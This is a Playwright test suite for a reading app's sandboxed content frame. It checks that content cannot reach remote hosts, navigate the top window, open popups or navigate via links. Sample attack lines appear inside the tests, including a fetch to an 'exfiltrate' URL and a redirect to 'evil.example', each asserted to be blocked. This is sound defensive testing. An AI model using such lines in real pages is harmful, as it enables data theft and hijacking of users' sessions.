import { test, expect, type Frame, type Page } from "@playwright/test";
import { openApp } from "./helpers.js";

// Sandbox test suite (QE-1454, spec §4.4, §7): attacks from the content frame
// that MUST fail. These run against the dev sandbox (`allow-scripts
// allow-same-origin`); the production frame is tighter (opaque origin,
// allow-scripts only) and the pagetml:// path-traversal checks live in Rust
// (QE-1429) — noted where a check can't be exercised in the browser build.

async function openContent(page: Page): Promise<Frame> {
  await openApp(page);
  await page.locator("[data-doc=prose]").click();
  await expect(page.getByTestId("counter")).toHaveText(/^1 \/ \d+$/);
  return page.frames().find((f) => f.url().includes("/app/content.html"))!;
}

test("remote network from content is blocked by default (CSP)", async ({ page }) => {
  const frame = await openContent(page);
  const result = await frame.evaluate(async () => {
    try {
      await fetch("https://example.com/exfiltrate", { mode: "no-cors" });
      return "allowed";
    } catch {
      return "blocked";
    }
  });
  expect(result).toBe("blocked");
});

test("content cannot navigate the top-level app away", async ({ page }) => {
  const frame = await openContent(page);
  const before = page.url();
  await frame.evaluate(() => {
    try {
      window.top!.location.href = "https://evil.example/";
    } catch {
      /* sandbox blocks ancestor navigation */
    }
  });
  await page.waitForTimeout(200);
  // The app did not navigate; still in reading mode.
  expect(page.url()).toBe(before);
  await expect(page.getByTestId("reading")).toBeVisible();
});

test("popups from content are denied", async ({ page }) => {
  const frame = await openContent(page);
  const opened = await frame.evaluate(() => {
    const w = window.open("https://example.com/", "_blank");
    return w !== null;
  });
  expect(opened).toBe(false);
});

test("a link in content does not navigate the frame", async ({ page }) => {
  // External links are cancelled in the frame and handed to the chrome; the
  // frame stays on the document (also covered in links.spec, asserted here as a
  // sandbox property).
  await page.addInitScript(() => {
    window.open = (() => null) as typeof window.open; // swallow the external open
  });
  const frame = await openContent(page);
  const urlBefore = frame.url();
  await frame.evaluate(() => {
    const a = document.createElement("a");
    a.href = "https://example.com/";
    a.textContent = "x";
    document.body.appendChild(a);
    a.click();
  });
  await page.waitForTimeout(150);
  expect(frame.url()).toBe(urlBefore);
});
